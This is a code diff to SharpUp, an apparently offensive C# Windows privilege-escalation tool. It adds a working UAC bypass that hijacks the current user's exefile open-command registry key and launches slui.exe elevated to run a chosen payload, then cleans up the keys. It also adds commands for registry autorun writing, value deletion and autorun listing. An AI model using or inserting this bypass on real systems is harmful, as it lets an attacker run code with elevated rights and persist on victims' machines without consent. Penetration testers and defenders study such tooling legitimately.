@@ -19,6 +19,7 @@ using System.Text.RegularExpressions;
 using Microsoft.Win32;
 using System.Xml;
 using System.Security.Cryptography;
+using System.Threading;
 
 namespace SharpUp
 {
@@ -841,18 +842,19 @@ namespace SharpUp
             {
                 Console.WriteLine("\r\n\r\n=== Unattended Install Files ===\r\n");
 
-                string windir = System.Environment.GetEnvironmentVariable("windir");
+                string drive = System.Environment.GetEnvironmentVariable("SystemDrive");
+
                 string[] SearchLocations =
                 {
-                    String.Format("{0}\\sysprep\\sysprep.xml", windir),
-                    String.Format("{0}\\sysprep\\sysprep.inf", windir),
-                    String.Format("{0}\\sysprep.inf", windir),
-                    String.Format("{0}\\Panther\\Unattended.xml", windir),
-                    String.Format("{0}\\Panther\\Unattend.xml", windir),
-                    String.Format("{0}\\Panther\\Unattend\\Unattend.xml", windir),
-                    String.Format("{0}\\Panther\\Unattend\\Unattended.xml", windir),
-                    String.Format("{0}\\System32\\Sysprep\\unattend.xml", windir),
-                    String.Format("{0}\\System32\\Sysprep\\Panther\\unattend.xml", windir)
+                    String.Format("{0}\\sysprep\\sysprep.xml", drive),
+                    String.Format("{0}\\sysprep\\sysprep.inf", drive),
+                    String.Format("{0}\\sysprep.inf", drive),
+                    String.Format("{0}\\Panther\\Unattended.xml", drive),
+                    String.Format("{0}\\Panther\\Unattend.xml", drive),
+                    String.Format("{0}\\Panther\\Unattend\\Unattend.xml", drive),
+                    String.Format("{0}\\Panther\\Unattend\\Unattended.xml", drive),
+                    String.Format("{0}\\System32\\Sysprep\\unattend.xml", drive),
+                    String.Format("{0}\\System32\\Sysprep\\Panther\\unattend.xml", drive)
                 };
 
                 foreach (string SearchLocation in SearchLocations)
@@ -1208,7 +1210,60 @@ namespace SharpUp
             GetMcAfeeSitelistFiles();
             GetCachedGPPPassword();
         }
-        
+
+
+        //https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
+        static void UacBypass_SLUI(string filename)
+        {
+            RegistryKey rkApp = Registry.CurrentUser.CreateSubKey("Software").CreateSubKey("Classes").CreateSubKey("exefile").CreateSubKey("shell").CreateSubKey("open").CreateSubKey("command");
+
+            rkApp.SetValue("", filename);
+
+            var startInfo = new ProcessStartInfo("C:\\Windows\\System32\\slui.exe");
+            startInfo.Verb = "runas";
+            Process.Start(startInfo);
+
+            Thread.Sleep(1000);
+            DeleteRegistryKey("CurrentUser", "Software\\Classes\\exefile\\shell\\open\\command");
+            DeleteRegistryKey("CurrentUser", "Software\\Classes\\exefile\\shell\\open");
+   
+
+        }
+
+        static void DeleteRegistryKey(string hiveBase, string subKey)
+        {
+            if (string.Equals(hiveBase, "CurrentUser", StringComparison.CurrentCultureIgnoreCase))
+            {
+                Registry.CurrentUser.DeleteSubKey(subKey);
+
+            }
+            else if (string.Equals(hiveBase, "LocalMachine", StringComparison.CurrentCultureIgnoreCase))
+            {
+
+                Registry.LocalMachine.DeleteSubKey(subKey);
+
+
+            }
+        }
+
+        static void DeleteRegistryValue(string hiveBase, string subKey, string name)
+        {
+            if (string.Equals(hiveBase, "CurrentUser", StringComparison.CurrentCultureIgnoreCase))
+            {
+                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey(subKey, true);
+                rkApp.DeleteValue(name);
+            }
+            else if (string.Equals(hiveBase, "LocalMachine", StringComparison.CurrentCultureIgnoreCase))
+            {
+
+                RegistryKey rkApp = Registry.LocalMachine.OpenSubKey(subKey, true);
+                rkApp.DeleteValue(name);
+
+
+            }
+        }
+
+
         static void WriteRegistry(string hiveBase, string subKey, string name, string command)
         {
 
@@ -1228,6 +1283,44 @@ namespace SharpUp
 
         }
 
+        public static void ListAutoruns()
+        {
+            Console.WriteLine("\r\n\r\n=== All Registry Autoruns ===\r\n");
+
+            string[] autorunLocations = new string[] {
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunService",
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceService",
+                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunService",
+
+
+
+            };
+
+            string[] hives = new string[] { "HKLM", "HKCU" };
+
+            foreach (string hive in hives)
+            {
+                foreach (string autorunLocation in autorunLocations)
+                {
+                    Dictionary<string, object> settings = GetRegValues(hive, autorunLocation);
+                    if ((settings != null) && (settings.Count != 0))
+                    {
+                        foreach (KeyValuePair<string, object> kvp in settings)
+                        {
+                           
+                             
+                            Console.WriteLine(String.Format("  {3}:\\{0}\\{1} : {2}", autorunLocation,kvp.Key,kvp.Value,hive));
+
+                        }
+                    }
+                }
+            }
+        }
+
         static void Main(string[] args)
         {
             bool auditMode = args.Contains("audit", StringComparer.CurrentCultureIgnoreCase);
@@ -1242,7 +1335,7 @@ namespace SharpUp
                 }
                 else
                 {
-                    System.Console.WriteLine("Usage: SharpView.exe WriteDacl <service>");
+                    System.Console.WriteLine("Usage: SharpView.exe WriteRegistryAutorun <service>");
 
                 }
             }
@@ -1252,6 +1345,7 @@ namespace SharpUp
                 {
                     WriteRegistry(hiveBase: args[1], subKey: args[2], name: args[3], command: args[4]);
                 }
+
                 else
                 {
                     System.Console.WriteLine("USage: SharpView.exe WriteRegistryAutorun <CurrentUser|LocalMachine> <subkey> <name> <command>");
@@ -1270,6 +1364,34 @@ namespace SharpUp
                     {
                         System.Console.WriteLine(autorunlocation);
                     }
+                }
+            }
+            else if (args.Contains("ListAutoruns", StringComparer.CurrentCultureIgnoreCase))
+            {
+                ListAutoruns();
+            }
+            else if (args.Contains("DeleteRegistryValue", StringComparer.CurrentCultureIgnoreCase))
+            {
+                if (args.Length == 4)
+                {
+                    DeleteRegistryValue(hiveBase: args[1], subKey: args[2], name: args[3]);
+                }
+                else
+                {
+                    System.Console.WriteLine("USage: SharpView.exe DeleteRegistryValue <CurrentUser|LocalMachine> <subkey> <name>");
+
+                }
+            }
+            else if (args.Contains("uac_slui", StringComparer.CurrentCultureIgnoreCase))
+            {
+                if (args.Length == 2)
+                {
+                    UacBypass_SLUI(filename: args[1]);
+                }
+                else
+                {
+                    System.Console.WriteLine("USage: SharpView.exe uac_slui <payload.exe>");
+
                 }
             }
             else
